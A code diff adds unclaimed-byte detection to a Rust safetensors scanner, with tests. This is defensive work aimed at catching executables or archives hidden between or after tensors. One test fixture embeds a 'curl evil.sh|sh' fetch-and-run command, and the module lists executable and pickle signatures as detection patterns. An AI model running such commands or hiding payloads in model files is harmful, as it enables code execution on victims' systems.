@@ -4,6 +4,12 @@
 //! format-level attack surface: a malformed header or overlapping/out-of-bounds
 //! tensor offsets can cause out-of-bounds reads or DoS at load time. We parse
 //! the `u64` length prefix + JSON header and validate every tensor's byte range.
+//!
+//! We also account for every byte. Validating that each tensor range is in
+//! bounds is not enough: bytes inside the data segment that *no* tensor claims
+//! are a storage channel the format cannot explain, they are invisible to every
+//! loader, and the manifest hash does not cover them. Real writers pack tensors
+//! contiguously, so any unclaimed region is reported.
 
 use serde_json::Value;
 
@@ -209,6 +215,14 @@ pub fn analyze(artifact_name: &str, data: &[u8]) -> ArtifactReport {
         }
     }
 
+    // Byte accounting: every byte of the data segment must belong to a tensor.
+    for f in unreferenced_findings(&intervals, data, data_start, data_seg_len) {
+        if f.severity >= Severity::Medium {
+            had_structural_finding = true;
+        }
+        report.push(f);
+    }
+
     // Manifest hash (stable across rename/repack).
     if !tensor_entries.is_empty() {
         report.hashes.manifest = Some(hash::manifest_hash(&mut tensor_entries));
@@ -220,6 +234,151 @@ pub fn analyze(artifact_name: &str, data: &[u8]) -> ArtifactReport {
         Verdict::Clean
     };
     report
+}
+
+/// At most this many individual regions are reported before we collapse the
+/// rest into one summary finding, so a file declaring thousands of tiny gaps
+/// cannot flood the report.
+const MAX_REPORTED_REGIONS: usize = 16;
+
+/// File signatures worth naming when they turn up in bytes nothing claims.
+const EMBEDDED_MAGICS: &[(&[u8], &str)] = &[
+    (b"\x7fELF", "an ELF executable"),
+    (b"\xfe\xed\xfa\xce", "a Mach-O executable"),
+    (b"\xfe\xed\xfa\xcf", "a Mach-O executable"),
+    (b"\xce\xfa\xed\xfe", "a Mach-O executable"),
+    (b"\xcf\xfa\xed\xfe", "a Mach-O executable"),
+    (b"\xca\xfe\xba\xbe", "a Mach-O universal binary"),
+    (b"PK\x03\x04", "a ZIP archive"),
+    (b"\x1f\x8b", "a gzip stream"),
+    (b"BZh", "a bzip2 stream"),
+    (b"\xfd7zXZ", "an xz stream"),
+    (b"7z\xbc\xaf\x27\x1c", "a 7-Zip archive"),
+    (b"%PDF-", "a PDF document"),
+    (b"\x89PNG", "a PNG image"),
+    (b"\x80\x02", "a python pickle stream"),
+    (b"\x80\x03", "a python pickle stream"),
+    (b"\x80\x04", "a python pickle stream"),
+    (b"\x80\x05", "a python pickle stream"),
+    (b"#!/", "a script shebang"),
+    (b"MZ", "a DOS/PE executable"),
+];
+
+/// Regions of the data segment that no tensor claims. `intervals` must be
+/// sorted by start offset; out-of-bounds tensors are already excluded.
+fn unreferenced_regions(intervals: &[(u64, u64, String)], data_seg_len: u64) -> Vec<(u64, u64)> {
+    let mut regions = Vec::new();
+    let mut cursor = 0u64;
+    for (begin, end, _) in intervals {
+        if *begin > cursor {
+            regions.push((cursor, begin - cursor));
+        }
+        cursor = cursor.max(*end);
+    }
+    if cursor < data_seg_len {
+        regions.push((cursor, data_seg_len - cursor));
+    }
+    regions
+}
+
+/// Name the file format a byte run announces itself as, if any.
+fn embedded_magic(region: &[u8]) -> Option<&'static str> {
+    EMBEDDED_MAGICS
+        .iter()
+        .find(|(magic, _)| region.starts_with(magic))
+        .map(|(_, label)| *label)
+}
+
+/// A short, escaped preview of bytes we are about to report on.
+fn preview(region: &[u8]) -> String {
+    let mut out = String::new();
+    for b in region.iter().take(32) {
+        match b {
+            0x20..=0x7e => out.push(*b as char),
+            _ => out.push_str(&format!("\\x{b:02x}")),
+        }
+    }
+    if region.len() > 32 {
+        out.push('…');
+    }
+    out
+}
+
+/// Report every byte of the data segment that no tensor accounts for.
+fn unreferenced_findings(
+    intervals: &[(u64, u64, String)],
+    data: &[u8],
+    data_start: usize,
+    data_seg_len: u64,
+) -> Vec<Finding> {
+    let regions = unreferenced_regions(intervals, data_seg_len);
+    let mut findings = Vec::new();
+    let mut hidden_total = 0u64;
+    let mut hidden_regions = 0usize;
+
+    for (i, (begin, len)) in regions.iter().enumerate() {
+        let start = data_start + *begin as usize;
+        let region = &data[start..start + *len as usize];
+        let placement = if begin + len == data_seg_len {
+            "after the last tensor"
+        } else {
+            "between tensors"
+        };
+
+        if region.iter().all(|b| *b == 0) {
+            if i < MAX_REPORTED_REGIONS {
+                findings.push(Finding::new(
+                    "ST_UNREFERENCED_BYTES",
+                    Severity::Low,
+                    format!(
+                        "{len} zero byte(s) {placement} belong to no tensor (file offset {start}); consistent \
+                         with alignment padding, but no loader reads them and the manifest \
+                         hash does not cover them"
+                    ),
+                ));
+            }
+            continue;
+        }
+
+        hidden_total += len;
+        hidden_regions += 1;
+        if i >= MAX_REPORTED_REGIONS {
+            continue;
+        }
+
+        let (severity, what) = match embedded_magic(region) {
+            Some(kind) => (Severity::High, format!("and begin with {kind} signature")),
+            None => (Severity::Medium, "and are not zero padding".to_string()),
+        };
+        findings.push(
+            Finding::new(
+                "ST_UNREFERENCED_BYTES",
+                severity,
+                format!(
+                    "{len} byte(s) {placement} belong to no tensor (file offset {start}) {what}; \
+                     safetensors cannot explain these bytes, no loader reads them, and \
+                     the manifest hash does not cover them"
+                ),
+            )
+            .with_evidence(vec![
+                format!("file offsets {start}..{}", start + *len as usize),
+                format!("first bytes: {}", preview(region)),
+            ]),
+        );
+    }
+
+    if hidden_regions > MAX_REPORTED_REGIONS {
+        findings.push(Finding::new(
+            "ST_UNREFERENCED_BYTES",
+            Severity::High,
+            format!(
+                "{hidden_regions} regions totalling {hidden_total} byte(s) belong to no tensor; \
+                 only the first {MAX_REPORTED_REGIONS} are listed above"
+            ),
+        ));
+    }
+
+    findings
 }
 
 fn malformed(mut report: ArtifactReport, id: &str, detail: impl Into<String>) -> ArtifactReport {
@@ -373,5 +532,190 @@ mod tests {
         buf.extend_from_slice(b"{}");
         let r = analyze("bad.safetensors", &buf);
         assert_eq!(r.verdict, Verdict::Malformed);
+    }
+
+    // -----------------------------------------------------------------
+    // Byte accounting: bytes no tensor claims
+    // -----------------------------------------------------------------
+
+    fn iv(spans: &[(u64, u64)]) -> Vec<(u64, u64, String)> {
+        spans
+            .iter()
+            .enumerate()
+            .map(|(i, (b, e))| (*b, *e, format!("t{i}")))
+            .collect()
+    }
+
+    fn findings_of<'a>(r: &'a ArtifactReport, id: &str) -> Vec<&'a Finding> {
+        r.findings.iter().filter(|f| f.id == id).collect()
+    }
+
+    /// Two tensors with a hole between them, and something hidden in the hole.
+    fn file_with_gap(payload: &[u8]) -> Vec<u8> {
+        let gap = payload.len() as u64;
+        let header = serde_json::json!({
+            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]},
+            "b": {"dtype": "U8", "shape": [4], "data_offsets": [4 + gap, 8 + gap]}
+        });
+        let mut data = vec![1u8, 2, 3, 4];
+        data.extend_from_slice(payload);
+        data.extend_from_slice(&[5, 6, 7, 8]);
+        build(&header, &data)
+    }
+
+    #[test]
+    fn contiguous_tensors_leave_nothing_unaccounted() {
+        assert!(unreferenced_regions(&iv(&[(0, 4), (4, 8)]), 8).is_empty());
+    }
+
+    #[test]
+    fn regions_finds_gaps_and_the_tail() {
+        assert_eq!(
+            unreferenced_regions(&iv(&[(0, 4), (8, 12)]), 12),
+            vec![(4, 4)]
+        );
+        assert_eq!(unreferenced_regions(&iv(&[(0, 4)]), 20), vec![(4, 16)]);
+        assert_eq!(
+            unreferenced_regions(&iv(&[(2, 4), (8, 10)]), 16),
+            vec![(0, 2), (4, 4), (10, 6)]
+        );
+    }
+
+    #[test]
+    fn a_contained_tensor_does_not_invent_a_gap() {
+        // 'b' sits inside 'a' (overlap, reported separately): the cursor must
+        // not rewind and report phantom unclaimed bytes after it.
+        assert!(unreferenced_regions(&iv(&[(0, 16), (4, 8)]), 16).is_empty());
+    }
+
+    #[test]
+    fn an_empty_data_segment_is_fully_accounted_for() {
+        assert!(unreferenced_regions(&[], 0).is_empty());
+    }
+
+    #[test]
+    fn magic_bytes_are_named() {
+        assert_eq!(
+            embedded_magic(b"\x7fELF\x02\x01"),
+            Some("an ELF executable")
+        );
+        assert_eq!(embedded_magic(b"PK\x03\x04rest"), Some("a ZIP archive"));
+        assert_eq!(
+            embedded_magic(b"\x80\x04\x95payload"),
+            Some("a python pickle stream")
+        );
+        assert_eq!(embedded_magic(b"just some bytes"), None);
+        assert_eq!(embedded_magic(b""), None);
+    }
+
+    #[test]
+    fn a_payload_hidden_between_tensors_is_caught() {
+        let buf = file_with_gap(b"\x7fELFcurl evil.sh|sh");
+        let r = analyze("model.safetensors", &buf);
+        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
+        assert_eq!(f.len(), 1, "expected exactly one region: {:?}", r.findings);
+        assert_eq!(f[0].severity, Severity::High);
+        assert!(f[0].detail.contains("between tensors"), "{}", f[0].detail);
+        assert!(f[0].detail.contains("an ELF executable"), "{}", f[0].detail);
+        // A file carrying content the format cannot explain is not clean.
+        assert_eq!(r.verdict, Verdict::Untrusted);
+    }
+
+    #[test]
+    fn unexplained_bytes_without_a_known_magic_still_fail() {
+        let buf = file_with_gap(b"some hidden note, no magic bytes");
+        let r = analyze("model.safetensors", &buf);
+        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, Severity::Medium);
+        assert_eq!(r.verdict, Verdict::Untrusted);
+    }
+
+    #[test]
+    fn data_appended_after_the_last_tensor_is_caught() {
+        let header = serde_json::json!({
+            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}
+        });
+        let mut data = vec![1u8, 2, 3, 4];
+        data.extend_from_slice(b"PK\x03\x04appended archive");
+        let r = analyze("model.safetensors", &build(&header, &data));
+        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, Severity::High);
+        assert!(
+            f[0].detail.contains("after the last tensor"),
+            "{}",
+            f[0].detail
+        );
+        assert!(f[0].detail.contains("a ZIP archive"), "{}", f[0].detail);
+        assert_eq!(r.verdict, Verdict::Untrusted);
+    }
+
+    #[test]
+    fn zero_padding_is_reported_but_does_not_condemn_the_file() {
+        let buf = file_with_gap(&[0u8; 24]);
+        let r = analyze("model.safetensors", &buf);
+        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, Severity::Low);
+        assert!(f[0].detail.contains("alignment padding"), "{}", f[0].detail);
+        assert_eq!(r.verdict, Verdict::Clean, "padding is not a payload");
+    }
+
+    #[test]
+    fn the_evidence_locates_the_bytes_in_the_file() {
+        let buf = file_with_gap(b"\x7fELFhidden");
+        let r = analyze("model.safetensors", &buf);
+        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
+        let ev = f[0].evidence.join(" ");
+        assert!(ev.contains("file offsets"), "{ev}");
+        assert!(ev.contains("\\x7fELFhidden"), "{ev}");
+        // The offsets are absolute, so `dd` on the reported range finds it.
+        let start: usize = ev
+            .split("file offsets ")
+            .nth(1)
+            .unwrap()
+            .split("..")
+            .next()
+            .unwrap()
+            .parse()
+            .unwrap();
+        assert_eq!(&buf[start..start + 4], b"\x7fELF");
+    }
+
+    #[test]
+    fn a_flood_of_gaps_is_collapsed_into_one_summary() {
+        // 40 tensors, each preceded by a one-byte hole carrying a payload byte.
+        let mut header = serde_json::Map::new();
+        let mut data = Vec::new();
+        for i in 0..40u64 {
+            data.push(b'X');
+            let begin = data.len() as u64;
+            data.extend_from_slice(&[1, 2, 3, 4]);
+            header.insert(
+                format!("t{i}"),
+                serde_json::json!({
+                    "dtype": "U8", "shape": [4], "data_offsets": [begin, begin + 4]
+                }),
+            );
+        }
+        let r = analyze("model.safetensors", &build(&Value::Object(header), &data));
+        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
+        assert_eq!(f.len(), MAX_REPORTED_REGIONS + 1, "cap plus one summary");
+        let summary = f.last().unwrap();
+        assert_eq!(summary.severity, Severity::High);
+        assert!(summary.detail.contains("40 regions"), "{}", summary.detail);
+        assert!(summary.detail.contains("40 byte(s)"), "{}", summary.detail);
+    }
+
+    #[test]
+    fn a_clean_contiguous_file_reports_nothing() {
+        let header = serde_json::json!({
+            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]},
+            "b": {"dtype": "U8", "shape": [4], "data_offsets": [4, 8]}
+        });
+        let r = analyze("model.safetensors", &build(&header, &[0u8; 8]));
+        assert!(findings_of(&r, "ST_UNREFERENCED_BYTES").is_empty());
+        assert_eq!(r.verdict, Verdict::Clean);
     }
 }
